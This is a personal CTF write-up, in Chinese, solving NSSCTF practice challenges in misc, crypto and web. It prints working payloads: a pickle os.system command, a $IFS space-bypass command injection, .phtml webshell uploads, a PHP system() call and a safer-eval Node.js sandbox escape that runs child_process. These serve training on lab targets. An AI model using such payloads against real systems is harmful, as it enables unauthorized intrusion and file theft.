# [个人] NSSCTF2026中旬的Writeup

# 2026中旬

## Misc

### [陇剑杯 2021]简单日志分析（问2）

#### 题目信息

> [陇剑杯 2021]简单日志分析（问2）
>
> 
>
> 1分
>
> 日志审计流量分析宽高修改
>
> 
>
> 
>
> 题目描述
>
> 某应用程序被攻击，请分析日志后作答：
> 黑客查看的秘密文件的绝对路径是_____________。得到的flag请使用NSSCTF{}格式提交。

#### 解题过程

**查看日志**

```shell
127.0.0.1 - - [07/Aug/2021 10:43:12] "GET /?user=STAKcDAKMFMnY2F0IC9UaDRzX0lTX1ZFUllfSW1wb3J0X0ZpMWUnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu HTTP/1.1" 500 -
```

```shell
I0
p0
0S'cat /Th4s_IS_VERY_Import_Fi1e'
p1
0(g0
lp2
0(I0
tp3
0(g3
I0
dp4
0cos
system
p5
0g5
(g1
tR.
```

**题目答案**

**得到：NSSCTF{/Th4s_IS_VERY_Import_Fi1e}**



## Crypto

### [SWPUCTF 2021 新生赛]crypto8

#### 题目信息

> [SWPUCTF 2021 新生赛]crypto8
>
> 
>
> 1分
>
> 古典密码其他MD5爆破
>
> 
>
> 
>
> 题目描述
>
> 得到的flag请使用NSSCTF{}格式提交。

#### 解题过程

**查看题目**

```shell
73E-30U1&>V-H965S95]I<U]P;W=E<GT`
```

**分析**

- 这是UUUUencode编码

- UUENCODE是一种将二进制文件转换为文本文件的编码方式，最早用于通过纯文本电子邮件传输二进制数据，属于Unix-to-Unix编码体系 [3]。该编码将3字节二进制数据重组为4组6位数据，通过加0x20偏移生成ASCII码32至95之间的可打印字符，编码效率高于Hex格式，处理后文件体积增加33%。

  编码数据以字符M标记行首，末尾行标识符包含实际字节数，每个附件包含文件名前缀和结束标记 [3]。UUENCODE函数在数据库应用中将RAW数据转换为特定格式字符串，可通过type参数控制返回类型，UUDECODE函数实现逆向解码 [1]。其局限性包括无法指示附件类型、不支持国际字符编码，且存在传输附件大小限制引发邮件异常的风险 [2-3]。MIME格式后续解决了上述技术缺陷 [3]。

#### 题目答案

```shell
UUUUencode解码: NSSCTF{cheese_is_power}
```

**得到：NSSCTF{cheese_is_power}**



## Web

### [SWPUCTF 2021 新生赛]babyrce

#### 题目信息

> [SWPUCTF 2021 新生赛]babyrce
>
> 1分
>
> 空格绕过RCECookie注入
>
> 
>
> 
>
> 题目描述
>
> 无描述

#### 解题过程

**查看题目**

```php
<?php
error_reporting(0);
header("Content-Type:text/html;charset=utf-8");
highlight_file(__FILE__);
if($_COOKIE['admin']==1) 
{
    include "../next.php";
}
else
    echo "小饼干最好吃啦！";
?>
```

```shell
http://node5.anna.nssctf.cn:24047/
POST admin=1
```

```shell
<?php
error_reporting(0);
highlight_file(__FILE__);
error_reporting(0);
if (isset($_GET['url'])) {
  $ip=$_GET['url'];
  if(preg_match("/ /", $ip)){
      die('nonono');
  }
  $a = shell_exec($ip);
  echo $a;
}
?>
```

```shell
http://node5.anna.nssctf.cn:24047/rasalghul.php?url=cat$IFS/f*
```

#### 题目答案

**得到：NSSCTF{a8d779c7-9fcf-4515-a606-8cde895e5cb7}**



### [第五空间 2021]WebFTP

#### 题目信息

> [第五空间 2021]WebFTP
>
> 1分
>
> 目录扫描信息收集.git泄露
>
> 
>
> 
>
> 题目描述
>
> 该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系管理员删除。

#### 解题过程

**信息搜集**

```shell
python dirsearch.py -u http://node4.anna.nssctf.cn:27244/ -e *
```

```shell
[10:16:57] 301 -  335B  - /.git  ->  http://node4.anna.nssctf.cn:27244/.git/
```

```shell
http://node4.anna.nssctf.cn:27244/phpinfo.php
```

```shell
FLAG	NSSCTF{4b3283e1-4c14-4b9d-aca0-11bfb733a0dc}
```

**分析**

- **如果访问不了`/phpinfo.php`的可能是网络问题，可以改用流量访问**

#### 题目答案

**得到：NSSCTF{4b3283e1-4c14-4b9d-aca0-11bfb733a0dc}**



### [SWPUCTF 2021 新生赛]easyupload2.0

#### 题目信息

> [SWPUCTF 2021 新生赛]easyupload2.0
>
> 1分
>
> 文件上传文件头绕过双写后缀
>
> 
>
> 
>
> 题目描述
>
> 无描述

#### 解题过程

**查看题目**

```shell
upload1.jpg
未选择文件
```

**分析**

- 文件上传漏洞
- 经测试拦截了.php，我们改用.phtml替代

**phtml.phtml**

```shell
<?=`ls / -alR`;
```

```shell
/app/flag.php
```

```shell
<?=`cat /app/flag.php`;
```

```shell
# 查看响应
<?php
$flag = 'NSSCTF{0b55af53-349d-4012-96d5-006b3146559a}';
?>
```

#### 题目答案

**得到：NSSCTF{0b55af53-349d-4012-96d5-006b3146559a}**



### [LitCTF 2023]导弹迷踪

#### 题目信息

> [LitCTF 2023]导弹迷踪
>
> 1分
>
> JS分析信息收集源码泄漏
>
> 
>
> 
>
> 题目描述
>
> 你是一颗导弹，你需要，飞到最后！（通过6道关卡就能拿到flag哦~
> Flag形式 NSSCTF{}
> 出题人 探姬

#### 解题过程

**查看源码**

**game.js**

```js
        FINISH: {
            title: function () {return 'LEVEL COMPLETED';},
            text:  function () {if (mLevel === 6) {return 'GOT F|L|A|G {y0u_w1n_th1s_!!!}';} else {return 'CLICK TO CONTINUE';}},
        }
```

#### 题目答案

**得到：NSSCTF{y0u_w1n_th1s_!!!}**



### [LitCTF 2023]PHP是世界上最好的语言！！

#### 题目信息

> [LitCTF 2023]PHP是世界上最好的语言！！
>
> 1分
>
> RCEPHP无参RCE
>
> 
>
> 
>
> 题目描述
>
> 探姬坚信PHP是世界上最好的语言，于是她用PHP写了一个小工具 （Flag位于根目录）
> Flag形式 NSSCTF{}
> 出题人 探姬

#### 解题过程

**测试题目**

```shell
test
```

```shell
{"code":-1002,"message":"line:1;  message:syntax error, unexpected end of file","data":[]}
```

**查看响应**

```shell
type=run
php_code=test
```

**分析**

- 猜测要用php代码

**继续测试**

```php
<?php ?>
```

```shell
无输出内容
```

```shell
<?php system("cat /f*") ?>
```

```shell
flag=NSSCTF{68832832-5ae6-4dc0-ac46-ee26fedccbed}
```

#### 题目答案

**得到：NSSCTF{68832832-5ae6-4dc0-ac46-ee26fedccbed}**



### [GKCTF 2020]ez三剑客-easynode

#### 题目信息

> [GKCTF 2020]ez三剑客-easynode
>
> 92分
>
> 沙盒逃逸NodeJS字符绕过
>
> 
>
> 
>
> 题目描述
>
> 无描述

#### 解题过程

**查看源码**

```python
const express = require('express');
const bodyParser = require('body-parser');

const saferEval = require('safer-eval'); // 2019.7/WORKER1 找到一个很棒的库

const fs = require('fs');

const app = express();


app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// 2020.1/WORKER2 老板说为了后期方便优化
app.use((req, res, next) => {
  if (req.path === '/eval') {
    let delay = 60 * 1000;
    console.log(delay);
    if (Number.isInteger(parseInt(req.query.delay))) {
      delay = Math.max(delay, parseInt(req.query.delay));
    }
    const t = setTimeout(() => next(), delay);
    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
    setTimeout(() => {
      clearTimeout(t);
      console.log('timeout');
      try {
        res.send('Timeout!');
      } catch (e) {

      }
    }, 1000);
  } else {
    next();
  }
});

app.post('/eval', function (req, res) {
  let response = '';
  if (req.body.e) {
    try {
      response = saferEval(req.body.e);
    } catch (e) {
      response = 'Wrong Wrong Wrong!!!!';
    }
  }
  res.send(String(response));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
  res.set('Content-Type', 'text/javascript;charset=utf-8');
  res.send(fs.readFileSync('./index.js'));
});

// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口
app.get('/version', function (req, res) {
  res.set('Content-Type', 'text/json;charset=utf-8');
  res.send(fs.readFileSync('./package.json'));
});

app.get('/', function (req, res) {
  res.set('Content-Type', 'text/html;charset=utf-8');
  res.send(fs.readFileSync('./index.html'))
})

app.listen(80, '0.0.0.0', () => {
  console.log('Start listening')
});
```

**分析**

- 用2147483648绕过delay

- 用

  ```js
  (function () {
    const process = clearImmediate.constructor("return process;")();
    return process.mainModule.require("child_process").execSync("cat /flag").toString()
  })()
  ```

  绕过safer-eval

#### 题目答案

```shell
http://node4.anna.nssctf.cn:20175/eval?delay=2147483648
POST e=(function () {
  const process = clearImmediate.constructor("return process;")();
  return process.mainModule.require("child_process").execSync("cat /flag").toString()
})()
```

```shell
NSSCTF{bc8e1a76-21af-4070-8e2b-dfd0c0811a07}
```

**得到：NSSCTF{bc8e1a76-21af-4070-8e2b-dfd0c0811a07}**
